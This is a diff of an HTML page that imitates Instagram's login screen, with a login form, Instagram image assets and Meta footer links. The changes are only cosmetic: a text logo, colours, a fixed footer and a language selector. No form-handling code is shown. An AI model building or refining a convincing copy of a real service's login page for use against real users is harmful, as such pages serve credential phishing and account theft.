@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yt/r/30PrGfR3xhB.png">
+    <link href="https://fonts.googleapis.com/css2?family=Lobster&display=swap" rel="stylesheet">
     <title>Instagram</title>
     <style>
         * {
@@ -14,7 +15,7 @@
 
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #ffffff;
+            background-color: #fafafa;
             display: flex;
             justify-content: center;
             align-items: center;
@@ -35,10 +36,15 @@
         .phone-mockup {
             margin-right: 32px;
             flex-shrink: 0;
+            position: relative;
+            width: 450px;
+            height: 580px;
         }
 
         .phone-mockup img {
-            height: 618px;
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
         }
 
         .form-container {
@@ -54,13 +60,13 @@
         }
 
         .instagram-logo {
-            background-image: url('data:image/svg+xml;charset=utf-8,%3Csvg xmlns="http://www.w3.org/2000/svg" width="175" height="51"%3E%3Cpath fill="%23262626" d="M57.49 9.56h-9.68v32.37h9.68V9.56zm-4.86-3.05c3.1 0 5.61-2.5 5.61-5.61 0-3.09-2.51-5.61-5.61-5.61-3.1 0-5.61 2.52-5.61 5.61 0 3.11 2.51 5.61 5.61 5.61zM95.56 19.03c-3.74 0-6.3 1.73-7.6 3.35v-2.82h-9.25v32.37h9.64V32.8c0-4.02 1.63-6.29 4.81-6.29 2.98 0 4.43 2.02 4.43 6.01v18.41h9.63V30.27c0-7.77-4.5-11.24-11.66-11.24zM75.86 29.34c-1.44-1.07-4.31-1.84-7.68-2.34-2.8-.41-4.07-1.18-4.07-2.56 0-1.43 1.43-2.43 3.62-2.43 2.31 0 3.81 1.06 3.88 2.76h8.97c-.33-5.43-5.06-8.74-12.74-8.74-7.12 0-12.65 3.26-12.65 8.96 0 4.4 2.86 7.04 8.82 8.02 3.48.58 5.73 1.08 7.01 1.77 1.13.6 1.67 1.45 1.67 2.63 0 1.82-1.67 2.98-4.35 2.98-3.07 0-4.93-1.35-5.05-3.67h-9.05c.26 6.08 5.52 9.36 13.95 9.36 7.65 0 13.41-3.39 13.41-9.12 0-3.5-1.73-6.03-5.74-7.62zM135.5 0c-7.46 0-13.5 6.04-13.5 13.5s6.04 13.5 13.5 13.5 13.5-6.04 13.5-13.5S142.96 0 135.5 0zm0 19.84c-3.5 0-6.34-2.84-6.34-6.34s2.84-6.34 6.34-6.34 6.34 2.84 6.34 6.34-2.84 6.34-6.34 6.34zm-16.59-8.28h-7.12v-5.5h-9.63v5.5h-4.2v7.15h4.2v13.42c0 6.54 3.16 9.53 10.24 9.53 1.88 0 3.63-.19 5.42-.65v-7.32c-1.18.23-2.13.35-3.15.35-2.25 0-3.39-.96-3.39-2.88V18.71h7.63v-7.15z"%3E%3C/path%3E%3C/svg%3E');
-            background-size: 175px 51px;
-            background-repeat: no-repeat;
-            background-position: center top;
-            height: 51px;
-            margin: 22px auto 12px;
-            overflow: hidden;
+            font-family: 'Lobster', 'Billabong', 'Brush Script MT', cursive;
+            font-size: 51px;
+            text-align: center;
+            margin: 36px auto 12px;
+            color: #000;
+            font-weight: 400;
+            letter-spacing: 0.5px;
         }
 
         .form-group {
@@ -211,28 +217,67 @@
         }
 
         .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background-color: #fafafa;
+            padding: 24px 0;
+            width: 100%;
+        }
+
+        .footer-content {
             max-width: 935px;
             margin: 0 auto;
-            padding: 0 20px 52px;
-            text-align: center;
+            padding: 0 20px;
         }
 
         .footer-links {
             display: flex;
             flex-wrap: wrap;
             justify-content: center;
-            gap: 16px;
-            margin-bottom: 12px;
+            gap: 12px 16px;
+            margin-bottom: 16px;
         }
 
         .footer-links a {
-            color: #8e8e8e;
+            color: #737373;
             font-size: 12px;
             text-decoration: none;
+            line-height: 14px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .footer-bottom {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 16px;
+        }
+
+        .language-selector {
+            display: flex;
+            align-items: center;
+            color: #737373;
+            font-size: 12px;
+            cursor: pointer;
+        }
+
+        .language-selector select {
+            background: transparent;
+            border: none;
+            color: #737373;
+            font-size: 12px;
+            cursor: pointer;
+            outline: none;
+            padding: 0;
         }
 
         .footer-copyright {
-            color: #8e8e8e;
+            color: #737373;
             font-size: 12px;
         }
 
@@ -282,6 +327,10 @@
             .phone-mockup {
                 display: none;
             }
+
+            .main-container {
+                margin-top: 0;
+            }
         }
 
         @media (max-width: 450px) {
@@ -297,6 +346,11 @@
             .signup-box {
                 border: none;
             }
+
+            .footer {
+                position: static;
+                margin-top: 20px;
+            }
         }
     </style>
 </head>
@@ -307,15 +361,15 @@
     </div>
 
     <div class="main-container">
-        <!-- Phone mockup - only visible on desktop -->
+        <!-- Phone mockup with image collage - only visible on desktop -->
         <div class="phone-mockup">
-            <img src="https://static.cdninstagram.com/rsrc.php/v3/y4/r/NameifKKkqV.png" alt="Instagram">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yS/r/ajlEU-wEDyo.png" alt="Instagram">
         </div>
 
         <!-- Login form -->
         <div class="form-container">
             <div class="login-box">
-                <div class="instagram-logo"></div>
+                <div class="instagram-logo">Instagram</div>
                 
                 <form id="loginForm">
                     <div class="error-message" id="errorMessage"></div>
@@ -362,23 +416,38 @@
     </div>
 
     <footer class="footer">
-        <div class="footer-links">
-            <a href="https://about.meta.com/" target="_blank">Meta</a>
-            <a href="https://about.instagram.com/" target="_blank">About</a>
-            <a href="https://about.instagram.com/blog" target="_blank">Blog</a>
-            <a href="https://about.instagram.com/about-us/careers" target="_blank">Jobs</a>
-            <a href="https://help.instagram.com/" target="_blank">Help</a>
-            <a href="https://developers.facebook.com/docs/instagram" target="_blank">API</a>
-            <a href="https://privacycenter.instagram.com/policy" target="_blank">Privacy</a>
-            <a href="https://help.instagram.com/581066165581870" target="_blank">Terms</a>
-            <a href="https://www.instagram.com/explore/locations/" target="_blank">Locations</a>
-            <a href="https://www.instagram.com/web/lite/" target="_blank">Instagram Lite</a>
-            <a href="https://www.threads.net/" target="_blank">Threads</a>
-            <a href="https://www.facebook.com/help/instagram/261704639352628" target="_blank">Contact Uploading & Non-Users</a>
-            <a href="https://about.meta.com/technologies/meta-verified/" target="_blank">Meta Verified</a>
-        </div>
-        <div class="footer-copyright">
-            © 2025 Instagram from Meta
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="https://about.meta.com/" target="_blank">Meta</a>
+                <a href="https://about.instagram.com/" target="_blank">About</a>
+                <a href="https://about.instagram.com/blog" target="_blank">Blog</a>
+                <a href="https://about.instagram.com/about-us/careers" target="_blank">Jobs</a>
+                <a href="https://help.instagram.com/" target="_blank">Help</a>
+                <a href="https://developers.facebook.com/docs/instagram" target="_blank">API</a>
+                <a href="https://privacycenter.instagram.com/policy" target="_blank">Privacy</a>
+                <a href="https://help.instagram.com/581066165581870" target="_blank">Terms</a>
+                <a href="https://www.instagram.com/explore/locations/" target="_blank">Locations</a>
+                <a href="https://www.instagram.com/web/lite/" target="_blank">Instagram Lite</a>
+                <a href="https://www.threads.net/" target="_blank">Threads</a>
+                <a href="https://www.facebook.com/help/instagram/261704639352628" target="_blank">Contact Uploading & Non-Users</a>
+                <a href="https://about.meta.com/technologies/meta-verified/" target="_blank">Meta Verified</a>
+            </div>
+            <div class="footer-bottom">
+                <div class="language-selector">
+                    <select>
+                        <option value="en">English</option>
+                        <option value="es">Español</option>
+                        <option value="fr">Français</option>
+                        <option value="de">Deutsch</option>
+                        <option value="it">Italiano</option>
+                        <option value="pt">Português (Brasil)</option>
+                        <option value="ja">日本語</option>
+                        <option value="ko">한국어</option>
+                        <option value="zh-cn">中文(简体)</option>
+                    </select>
+                </div>
+                <span class="footer-copyright">© 2025 Instagram from Meta</span>
+            </div>
         </div>
     </footer>
 
